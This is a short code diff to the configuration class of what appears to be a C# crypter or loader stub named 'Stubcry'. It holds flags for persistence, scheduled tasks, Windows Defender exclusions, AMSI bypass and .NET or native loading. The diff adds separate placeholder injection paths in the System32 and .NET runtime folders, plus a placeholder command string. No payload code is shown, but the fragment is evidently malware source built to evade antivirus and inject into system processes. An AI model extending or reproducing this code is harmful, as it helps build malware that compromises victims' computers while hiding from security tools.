@@ -10,6 +10,8 @@ namespace Stubcry
     {
         public static bool istartup = false;
         public static bool ispersist = false;
+        public static bool isNet = false;
+        public static bool isNative = false;
         public static bool istask = false;
         public static bool isdotnet = false;
         public static bool isexcludewd = false;
@@ -26,7 +28,9 @@ namespace Stubcry
         public static bool isdotnetload = false;
         public static bool ispassamsi = false;
         public static bool ispwcommand = false;
-        public static string ipath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#INJECTPATH");
+        public static string nativeipath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#NATIVEINJECTPATH");
+
+        public static string dotnetipath = Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), "#DOTNETINJECTPATH");
         public static string command = "$command";
     }
 }
